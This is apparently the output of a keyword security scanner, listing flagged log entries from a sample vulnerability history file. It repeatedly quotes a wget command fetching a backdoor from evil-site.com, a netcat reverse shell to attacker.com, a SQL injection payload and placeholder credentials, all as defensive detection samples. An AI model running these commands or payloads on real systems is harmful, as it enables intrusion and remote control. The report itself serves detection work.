Scan report for: /example/secure-scan/data/.DS_Store
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
✅ No matches found.

Scan report for: /example/secure-scan/data/vulnerability_history.json
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 703
HIGH: 129
MEDIUM: 97
LOW: 0

Line 259 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
Line 2127 | UNKNOWN | admin_endpoint | "content": "WARN Admin endpoint accessed: /admin/dashboard"
Line 2156 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2164 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2172 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2180 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2188 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2196 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2204 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2212 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2220 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2228 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2236 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2244 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2252 | UNKNOWN | os_system_usage | "content": "WARN Shell execution detection: os.system(cmd)"
Line 2281 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2289 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2297 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2305 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2313 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2321 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2329 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2337 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2345 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2353 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2361 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2369 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2377 | UNKNOWN | download_activity | "content": "WARN wget http://evil-site.com/backdoor.sh"
Line 2406 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2414 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2422 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2430 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2438 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2446 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2454 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2462 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2470 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2478 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2486 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2494 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2502 | UNKNOWN | reverse_shell | "content": "WARN nc -e /bin/sh attacker.com 4444"
Line 2531 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2539 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2547 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2555 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2563 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2571 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2579 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2587 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2595 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2603 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2611 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2619 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2627 | UNKNOWN | default_credentials | "content": "ERROR Default credentials detected admin:admin"
Line 2656 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2664 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2672 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2680 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2688 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2696 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2704 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2712 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2720 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2728 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2736 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2744 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2752 | UNKNOWN | pickle_loads | "content": "ERROR Unsafe deserialization: pickle.loads(user_data)"
Line 2781 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2789 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2797 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2805 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2813 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2821 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2829 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2837 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2845 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2853 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2861 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2869 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2877 | UNKNOWN | eval_usage | "content": "CRITICAL Dangerous eval detected: eval(user_input)"
Line 2906 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2914 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2922 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2930 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2938 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2946 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2954 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2962 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2970 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2978 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2986 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 2994 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 3002 | UNKNOWN | powershell | "content": "ALERT powershell.exe -ExecutionPolicy Bypass"
Line 3406 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3414 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3422 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3430 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3438 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3446 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3454 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3462 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3470 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3478 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3486 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3494 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3502 | UNKNOWN | debug_endpoint | "content": "WARN Debug endpoint exposed: /debug/config"
Line 3656 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3664 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3672 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3680 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3688 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3696 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3704 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3712 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3720 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3728 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3736 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3744 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3752 | UNKNOWN | ip_address | "content": "INFO User login success user=alice ip=10.0.0.5"
Line 3781 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3789 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3797 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3805 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3813 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3821 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3829 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3837 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3845 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3853 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3861 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3869 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3877 | UNKNOWN | email | "content": "INFO Contact admin@test.com immediately"
Line 3906 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3914 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3922 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3930 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3938 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3946 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3954 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3962 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3970 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3978 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3986 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 3994 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 4002 | UNKNOWN | api_endpoint | "content": "INFO Request made to /api/users/profile"
Line 4148 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4156 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4164 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4172 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4180 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4188 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4196 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4204 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4212 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4220 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4228 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4236 | UNKNOWN | weak_password | "content": "\"content\": \"Password found: password123\""
Line 4265 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4273 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4281 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4289 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4297 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4305 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4313 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4321 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4329 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4337 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4345 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4353 | UNKNOWN | default_credentials | "content": "\"content\": \"Default credentials detected: admin:admin\""
Line 4382 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4390 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4398 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4406 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4414 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4422 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4430 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4438 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4446 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4454 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4462 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4470 | UNKNOWN | sql_injection_payload | "content": "\"content\": \"SQL injection attempt: ' OR '1'='1\""
Line 4499 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4507 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4515 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4523 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4531 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4539 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4547 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4555 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4563 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4571 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4579 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4587 | UNKNOWN | api_key_assignment | "content": "\"content\": \"Sensitive data exposed: api_key=12345\""
Line 4733 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4741 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4749 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4757 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4765 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4773 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4781 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4789 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4797 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4805 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4813 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4821 | UNKNOWN | github_token | "content": "\"content\": \"WARN admin token exposed: ghp_exampletoken\""
Line 4850 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4858 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4866 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4874 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4882 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4890 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4898 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4906 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4914 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4922 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4930 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4938 | UNKNOWN | password_assignment | "content": "\"content\": \"password=12345\""
Line 4967 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 4975 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 4983 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 4991 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 4999 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5007 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5015 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5023 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5031 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5039 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5047 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5055 | UNKNOWN | admin_endpoint | "content": "\"content\": \"WARN Admin endpoint accessed: /admin/dashboard\""
Line 5084 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5092 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5100 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5108 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5116 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5124 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5132 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5140 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5148 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5156 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5164 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5172 | UNKNOWN | os_system_usage | "content": "\"content\": \"WARN Shell execution detection: os.system(cmd)\""
Line 5201 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5209 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5217 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5225 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5233 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5241 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5249 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5257 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5265 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5273 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5281 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5289 | UNKNOWN | download_activity | "content": "\"content\": \"WARN wget http://evil-site.com/backdoor.sh\""
Line 5318 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5326 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5334 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5342 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5350 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5358 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5366 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5374 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5382 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5390 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5398 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5406 | UNKNOWN | reverse_shell | "content": "\"content\": \"WARN nc -e /bin/sh attacker.com 4444\""
Line 5435 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5443 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5451 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5459 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5467 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5475 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5483 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5491 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5499 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5507 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5515 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5523 | UNKNOWN | pickle_loads | "content": "\"content\": \"ERROR Unsafe deserialization: pickle.loads(user_data)\""
Line 5552 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5560 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
